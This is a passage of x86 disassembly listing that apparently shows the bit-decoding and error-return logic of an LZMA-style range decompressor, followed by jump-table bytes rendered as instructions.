  407240:	0b d9                	or     %ecx,%ebx
  407242:	66 8b c8             	mov    %ax,%cx
  407245:	66 c1 e9 05          	shr    $0x5,%cx
  407249:	2b c1                	sub    %ecx,%eax
  40724b:	47                   	inc    %edi
  40724c:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40724f:	66 89 06             	mov    %ax,(%esi)
  407252:	89 7d b0             	mov    %edi,-0x50(%ebp)
  407255:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40725c:	73 88                	jae    0x4071e6
  40725e:	e9 5e ff ff ff       	jmp    0x4071c1
  407263:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  407266:	ff 45 d4             	incl   -0x2c(%ebp)
  407269:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40726c:	85 c0                	test   %eax,%eax
  40726e:	0f 84 84 02 00 00    	je     0x4074f8
  407274:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  407277:	0f 87 b8 02 00 00    	ja     0x407535
  40727d:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  407281:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407284:	01 45 a0             	add    %eax,-0x60(%ebp)
  407287:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  40728b:	0f 84 6d 02 00 00    	je     0x4074fe
  407291:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407294:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  407297:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40729a:	72 03                	jb     0x40729f
  40729c:	03 45 8c             	add    -0x74(%ebp),%eax
  40729f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4072a2:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  4072a5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4072a8:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  4072ab:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  4072ae:	40                   	inc    %eax
  4072af:	33 d2                	xor    %edx,%edx
  4072b1:	f7 75 8c             	divl   -0x74(%ebp)
  4072b4:	8b 45 98             	mov    -0x68(%ebp),%eax
  4072b7:	ff 45 98             	incl   -0x68(%ebp)
  4072ba:	ff 4d 9c             	decl   -0x64(%ebp)
  4072bd:	ff 4d d0             	decl   -0x30(%ebp)
  4072c0:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  4072c4:	88 08                	mov    %cl,(%eax)
  4072c6:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4072c9:	7f bc                	jg     0x407287
  4072cb:	e9 78 fd ff ff       	jmp    0x407048
  4072d0:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4072d4:	75 20                	jne    0x4072f6
  4072d6:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4072d9:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  4072dd:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4072e0:	c1 e0 04             	shl    $0x4,%eax
  4072e3:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  4072e7:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4072ea:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  4072f1:	e9 ce 00 00 00       	jmp    0x4073c4
  4072f6:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4072f9:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  407300:	00 00 00 
  407303:	8d 70 02             	lea    0x2(%eax),%esi
  407306:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407309:	66 8b 06             	mov    (%esi),%ax
  40730c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40730f:	0f b7 d0             	movzwl %ax,%edx
  407312:	c1 e9 0b             	shr    $0xb,%ecx
  407315:	0f af ca             	imul   %edx,%ecx
  407318:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  40731b:	73 18                	jae    0x407335
  40731d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407320:	b9 00 08 00 00       	mov    $0x800,%ecx
  407325:	2b ca                	sub    %edx,%ecx
  407327:	c1 f9 05             	sar    $0x5,%ecx
  40732a:	03 c8                	add    %eax,%ecx
  40732c:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  407330:	66 89 0e             	mov    %cx,(%esi)
  407333:	eb 19                	jmp    0x40734e
  407335:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  407338:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40733b:	66 8b c8             	mov    %ax,%cx
  40733e:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  407345:	66 c1 e9 05          	shr    $0x5,%cx
  407349:	2b c1                	sub    %ecx,%eax
  40734b:	66 89 06             	mov    %ax,(%esi)
  40734e:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407355:	73 25                	jae    0x40737c
  407357:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40735b:	0f 84 a9 01 00 00    	je     0x40750a
  407361:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407364:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407367:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40736b:	0f b6 09             	movzbl (%ecx),%ecx
  40736e:	ff 4d 94             	decl   -0x6c(%ebp)
  407371:	c1 e0 08             	shl    $0x8,%eax
  407374:	0b c1                	or     %ecx,%eax
  407376:	ff 45 90             	incl   -0x70(%ebp)
  407379:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40737c:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  407382:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  407388:	e9 91 f7 ff ff       	jmp    0x406b1e
  40738d:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407391:	75 1c                	jne    0x4073af
  407393:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  407396:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  407399:	c1 e0 04             	shl    $0x4,%eax
  40739c:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  4073a3:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  4073aa:	e9 38 ff ff ff       	jmp    0x4072e7
  4073af:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  4073b6:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  4073bd:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  4073c4:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  4073cb:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4073ce:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4073d5:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4073d8:	eb 28                	jmp    0x407402
  4073da:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4073de:	0f 84 32 01 00 00    	je     0x407516
  4073e4:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4073e7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4073ea:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4073ee:	0f b6 09             	movzbl (%ecx),%ecx
  4073f1:	ff 4d 94             	decl   -0x6c(%ebp)
  4073f4:	c1 e0 08             	shl    $0x8,%eax
  4073f7:	0b c1                	or     %ecx,%eax
  4073f9:	ff 45 90             	incl   -0x70(%ebp)
  4073fc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4073ff:	ff 4d b8             	decl   -0x48(%ebp)
  407402:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  407406:	7e 5e                	jle    0x407466
  407408:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40740b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40740e:	c1 e9 0b             	shr    $0xb,%ecx
  407411:	8d 14 00             	lea    (%eax,%eax,1),%edx
  407414:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407417:	8d 34 02             	lea    (%edx,%eax,1),%esi
  40741a:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40741d:	66 8b 06             	mov    (%esi),%ax
  407420:	0f b7 f8             	movzwl %ax,%edi
  407423:	0f af cf             	imul   %edi,%ecx
  407426:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  407429:	73 17                	jae    0x407442
  40742b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40742e:	b9 00 08 00 00       	mov    $0x800,%ecx
  407433:	2b cf                	sub    %edi,%ecx
  407435:	c1 f9 05             	sar    $0x5,%ecx
  407438:	03 c8                	add    %eax,%ecx
  40743a:	d1 65 b0             	shll   $1,-0x50(%ebp)
  40743d:	66 89 0e             	mov    %cx,(%esi)
  407440:	eb 16                	jmp    0x407458
  407442:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  407445:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407448:	66 8b c8             	mov    %ax,%cx
  40744b:	66 c1 e9 05          	shr    $0x5,%cx
  40744f:	2b c1                	sub    %ecx,%eax
  407451:	42                   	inc    %edx
  407452:	66 89 06             	mov    %ax,(%esi)
  407455:	89 55 b0             	mov    %edx,-0x50(%ebp)
  407458:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40745f:	73 9e                	jae    0x4073ff
  407461:	e9 74 ff ff ff       	jmp    0x4073da
  407466:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  407469:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  40746c:	33 c0                	xor    %eax,%eax
  40746e:	40                   	inc    %eax
  40746f:	d3 e0                	shl    %cl,%eax
  407471:	2b d8                	sub    %eax,%ebx
  407473:	8b 45 84             	mov    -0x7c(%ebp),%eax
  407476:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407479:	e9 04 ff ff ff       	jmp    0x407382
  40747e:	01 5d d0             	add    %ebx,-0x30(%ebp)
  407481:	8b 45 80             	mov    -0x80(%ebp),%eax
  407484:	e9 f9 fe ff ff       	jmp    0x407382
  407489:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  407490:	00 00 00 
  407493:	e9 88 00 00 00       	jmp    0x407520
  407498:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  40749f:	00 00 00 
  4074a2:	eb 7c                	jmp    0x407520
  4074a4:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  4074ab:	00 00 00 
  4074ae:	eb 70                	jmp    0x407520
  4074b0:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  4074b7:	00 00 00 
  4074ba:	eb 64                	jmp    0x407520
  4074bc:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  4074c3:	00 00 00 
  4074c6:	eb 58                	jmp    0x407520
  4074c8:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  4074cf:	00 00 00 
  4074d2:	eb 4c                	jmp    0x407520
  4074d4:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  4074db:	00 00 00 
  4074de:	eb 40                	jmp    0x407520
  4074e0:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  4074e7:	00 00 00 
  4074ea:	eb 34                	jmp    0x407520
  4074ec:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  4074f3:	00 00 00 
  4074f6:	eb 28                	jmp    0x407520
  4074f8:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  4074fc:	eb 22                	jmp    0x407520
  4074fe:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  407505:	00 00 00 
  407508:	eb 16                	jmp    0x407520
  40750a:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  407511:	00 00 00 
  407514:	eb 0a                	jmp    0x407520
  407516:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  40751d:	00 00 00 
  407520:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  407526:	6a 22                	push   $0x22
  407528:	59                   	pop    %ecx
  407529:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  40752f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407531:	33 c0                	xor    %eax,%eax
  407533:	eb 03                	jmp    0x407538
  407535:	83 c8 ff             	or     $0xffffffff,%eax
  407538:	5f                   	pop    %edi
  407539:	5e                   	pop    %esi
  40753a:	5b                   	pop    %ebx
  40753b:	c9                   	leave
  40753c:	c3                   	ret
  40753d:	34 6b                	xor    $0x6b,%al
  40753f:	40                   	inc    %eax
  407540:	00 d9                	add    %bl,%cl
  407542:	6b 40 00 74          	imul   $0x74,0x0(%eax),%eax
  407546:	6c                   	insb   (%dx),%es:(%edi)
  407547:	40                   	inc    %eax
  407548:	00 49 6c             	add    %cl,0x6c(%ecx)
  40754b:	40                   	inc    %eax
  40754c:	00 09                	add    %cl,(%ecx)
  40754e:	73 40                	jae    0x407590
  407550:	00 57 73             	add    %dl,0x73(%edi)
  407553:	40                   	inc    %eax
  407554:	00 9a 6c 40 00 39    	add    %bl,0x3900406c(%edx)
  40755a:	6f                   	outsl  %ds:(%esi),(%dx)
  40755b:	40                   	inc    %eax
  40755c:	00 a3 6f 40 00 e6    	add    %ah,-0x19ffbf91(%ebx)
  407562:	6f                   	outsl  %ds:(%esi),(%dx)
  407563:	40                   	inc    %eax
  407564:	00 57 70             	add    %dl,0x70(%edi)
  407567:	40                   	inc    %eax
  407568:	00 7e 70             	add    %bh,0x70(%esi)
  40756b:	40                   	inc    %eax
  40756c:	00 3e                	add    %bh,(%esi)
  40756e:	71 40                	jno    0x4075b0
  407570:	00 33                	add    %dh,(%ebx)
  407572:	6d                   	insl   (%dx),%es:(%edi)
  407573:	40                   	inc    %eax
  407574:	00 ec                	add    %ch,%ah
  407576:	6d                   	insl   (%dx),%es:(%edi)
  407577:	40                   	inc    %eax
  407578:	00 b0 6e 40 00 c1    	add    %dh,-0x3effbf92(%eax)
  40757e:	71 40                	jno    0x4075c0
  407580:	00 91 6f 40 00 d0    	add    %dl,-0x2fffbf91(%ecx)
  407586:	72 40                	jb     0x4075c8
  407588:	00 8d 73 40 00 7e    	add    %cl,0x7e004073(%ebp)
  40758e:	74 40                	je     0x4075d0
  407590:	00 b8 70 40 00 cf    	add    %bh,-0x30ffbf90(%eax)
  407596:	70 40                	jo     0x4075d8
  407598:	00 cb                	add    %cl,%bl
  40759a:	73 40                	jae    0x4075dc
  40759c:	00 da                	add    %bl,%dl
  40759e:	73 40                	jae    0x4075e0
  4075a0:	00 fd                	add    %bh,%ch
  4075a2:	70 40                	jo     0x4075e4
  4075a4:	00 7f 6e             	add    %bh,0x6e(%edi)
  4075a7:	40                   	inc    %eax
  4075a8:	00 0a                	add    %cl,(%edx)
  4075aa:	70 40                	jo     0x4075ec
  4075ac:	00                   	.byte 0
  4075ad:	87 72 40             	xchg   %esi,0x40(%edx)
	...
